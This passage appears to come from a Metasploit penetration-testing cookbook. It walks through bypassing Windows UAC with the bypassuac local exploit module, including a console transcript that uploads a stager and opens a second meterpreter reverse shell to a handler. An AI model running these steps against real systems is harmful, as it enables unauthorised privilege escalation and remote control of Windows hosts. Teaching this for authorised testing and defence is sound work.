# How to do it...

Before we can use getsystem to perform a privilege escalation attack, we first need to bypass UAC. To list all the available exploits that will allow us to bypass UAC, we can use the search command as follows:

![](bbox=[0.125, 0.22, 0.87, 0.36])

Without going into detail about each exploitation technique, we will try to use the Windows Escalate UAC Protection Bypass to bypass Windows UAC by utilizing the trusted publisher certificate through process injection. This module bypasses Windows UAC by utilizing the trusted publisher certificate through process injection, spawning a second shell with the UAC flag turned off:

```
meterpreter > background
[*] Backgrounding session 1...
msf exploit(handler) > use exploit/windows/local
/bypassuac
msf exploit(bypassuac) > set SESSION 1
SESSION => 1
msf exploit(bypassuac) > exploit

[*] Started reverse TCP handler on 192.168.216.5:4444
[*] UAC is Enabled, checking level...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[+] Part of Administrators group! Continuing...
[*] Uploaded the agent to the filesystem....
[*] Uploading the bypass UAC executable to the filesystem...
[*] Meterpreter stager executable 73802 bytes long being uploaded..
[*] Sending stage (179267 bytes) to 192.168.216.137
[*] Meterpreter session 2 opened (192.168.216.5:4444 -> 192.168.216.137:49160) at 2017-11-25 09:27:16 -0500

meterpreter >
```